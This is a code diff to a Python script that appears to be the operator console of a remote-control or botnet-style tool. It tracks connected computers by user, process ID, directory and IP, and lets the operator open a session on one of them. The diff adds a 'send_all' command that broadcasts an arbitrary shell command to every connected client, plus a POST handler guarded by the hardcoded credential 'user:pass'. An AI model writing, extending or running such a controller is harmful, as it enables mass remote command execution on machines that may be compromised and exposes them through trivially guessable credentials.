@@ -4,7 +4,7 @@ import socketserver
 from threading import Thread
 from legend import server_legacy
 
-import socket
+import socket, base64
 from http.server import BaseHTTPRequestHandler
 
 global req_head, flag
@@ -50,26 +50,37 @@ class Server(BaseHTTPRequestHandler):
 
 
     def do_POST(self):
-        global req_head, flag
-        req_head = str(self.rfile.read( int(self.headers.get('content-length')) ))[2:-1]
-        req_head = req_head.split('&')
-        keys, vals = [], []
+        creds = 'user:pass'.encode()
+        if self.headers.get('Authorization') == f'Basic {str(base64.b64encode(creds))[2:-1]}':
+            global req_head, flag
+            req_head = str(self.rfile.read( int(self.headers.get('content-length')) ))[2:-1]
+            req_head = req_head.split('&')
+            keys, vals = [], []
 
-        for el in req_head:
-            key = el.split('=')[0]
-            val = el.split('=')[1]
-            keys.append(key)
-            vals.append(val)
+            for el in req_head:
+                key = el.split('=')[0]
+                val = el.split('=')[1]
+                keys.append(key)
+                vals.append(val)
 
-        req_head = dict(zip(keys, vals))
-        del keys
-        del vals
+            req_head = dict(zip(keys, vals))
+            del keys
+            del vals
 
-        flag = True
-        self.send_response(200)
+            flag = True
+            self.send_response(200)
 
     def log_message(self, format, *args):
         return
+
+def send_all(clients, command):
+    keys = list(clients.keys())
+    for el in keys:
+        c = clients[el]
+        c.initiate()
+        c.send(command)
+        c.close()
+
 
 def prety(clients):
     strin = {'alias': 5, 'ops': 3, 'user': 4, 'pid': 3, 'pwd': 3, 'clientip': 8}
@@ -120,6 +131,13 @@ def prety(clients):
         print('│ None │')
         print('└' + '─' * 6 + '┘')
 
+def help():
+    print(r"""
+    comps - display connected computers
+    connect [-A] - connect to computer with alias
+    alias [-pr_A] [-new_A] - rename connection from A to B
+    """)
+
 
 host = socket.getaddrinfo(socket.gethostname(), None)
 ipv4_addresses = [i[4][0] for i in host if i[0] == socket.AF_INET]
@@ -147,9 +165,12 @@ while True:
         alias += 1
 
     com = input("Command >> ").split()
-    if 'connect' in com:
+    if com == ['help']:
+        help()
+
+    elif 'connect' in com:
         try:
-            Client = clients.get(int(com[1]) if com[1].isdigit() else com[1])
+            Client = clients.get(com[1])
             Client.initiate()
             cur_pwd = pwd
             while True:
@@ -186,3 +207,8 @@ while True:
             clients[new_al].alias_cle = new_al
             cprint.ok('Done!')
 
+    elif com == ['send_all']:
+        com = input("Command for all >> ")
+        send_all(clients, com)
+    
+    
